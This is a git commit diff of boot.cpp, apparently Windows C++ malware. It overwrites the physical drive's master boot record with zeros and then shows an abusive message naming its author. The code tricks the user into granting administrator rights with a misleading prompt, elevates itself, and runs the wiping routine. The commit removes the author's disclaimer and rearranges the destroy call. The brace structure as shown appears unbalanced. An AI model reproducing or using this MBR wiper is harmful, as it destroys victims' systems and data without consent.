a90c540f2a2c8fcfef40f14ff1829f25f30892f4
manjoos <71747405+0xmanjoos@users.noreply.github.com>
2021-01-20 22:54:47 -0800

    Update boot.cpp

--- boot.cpp
+++ boot.cpp
@@ -2,25 +2,18 @@
 #define WIN32_LEAN_AND_MEAN
 #define BUFFER 512
 
-/*
-This was my original intention on using this, its pretty fun but ineffective nowadays.
-
-[ DISCLAIMER ]
-I DO NOT CONDONE ANY ILLEGAL ACTIONS AND I WILL NOT BE RESPONSIBLE FOR WHATEVER DAMAGE YOU MAY CAUSE
-*/
-
 void destroy(){
 	FreeConsole();
 	DWORD write;
 	char mbrData[BUFFER];
 	ZeroMemory(&mbrData, sizeof(mbrData));
-	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
+    HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE,      //Get a handle on the MBR File
+        NULL, OPEN_EXISTING, 0, NULL);
 	if(WriteFile(MBR, mbrData, 512, &write, NULL)==true) {
-		MessageBox(0, "LULZ", "Youve been fucked retard XD, feel free to direct all hate towards -- manjoos#0745", MB_OK);
-		exit(0);
-	}
+		MessageBox(0, "Youve been fucked retard XD, feel free to direct all hate towards -- manjoos#0745", "LULZ", 0);
+
 	CloseHandle(MBR);
-	exit(0);
+	ExitProcess(0);
 }
 bool admin() {
 	bool fRet = FALSE;
@@ -49,20 +42,22 @@ void elevate() {
 		if(!ShellExecuteEx(&sei)) {
 			DWORD Error = GetLastError();
 			if (Error==ERROR_CANCELLED) {
-				exit(0);		
+				ExitProcess(0);
 			}
+		} else {
+			destroy();
 		}
 	}
 }
-int main(int argc, char* argv[]){
+int main(){
 	bool check;
 	FreeConsole();
 	if (admin()==false) {
 			check = MessageBox(0, "Hey you there, yea you, do you want to give meh some admin privs?", "ERROR", MB_OK);
 			if (check == 1) {
-				elevate(); destroy();
+				elevate();
 		} else {
-			exit(0);
+			ExitProcess(0);
 		}
 	return 0;
 	}
